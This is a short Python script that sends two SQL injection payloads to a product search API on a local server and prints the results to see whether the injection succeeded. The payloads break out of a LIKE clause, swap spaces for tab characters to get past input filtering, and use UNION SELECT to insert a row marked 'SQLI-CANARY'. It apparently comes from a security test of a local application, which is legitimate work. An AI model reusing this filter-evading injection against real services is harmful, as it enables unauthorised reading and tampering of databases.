import urllib.request, urllib.parse, json

def call(k):
    url = 'http://127.0.0.1:8081/api/products/search?keyword=' + urllib.parse.quote(k)
    try:
        r = urllib.request.urlopen(url)
        j = json.loads(r.read().decode('utf-8', 'replace'))
        prods = (j.get('data') or {}).get('products')
        print('KEY=', repr(k))
        print('STATUS=', r.status, 'SUCCESS=', j.get('success'), 'N=', len(prods) if prods is not None else None, 'MSG=', j.get('message'))
        if prods:
            for p in prods[:3]:
                print('   ', p.get('product_no'), '|', p.get('name'), '|', p.get('price'), '|', p.get('shop_name'))
    except Exception as e:
        print('KEY=', repr(k), 'ERR=', type(e).__name__, str(e)[:300])

T = '\t'
payloads = [
    "zzzz%'" + T + "UNION" + T + "SELECT" + T + "999,'PWN',1,'SQLI-CANARY','desc',1.00,1,NULL,0,NULL,NULL,0,1,NOW(),NOW(),'shop",
    "%'" + T + "UNION" + T + "SELECT" + T + "999,'PWN',1,'SQLI-CANARY','desc',1.00,1,NULL,0,NULL,NULL,0,1,NOW(),NOW(),'shop",
]
for p in payloads:
    call(p)
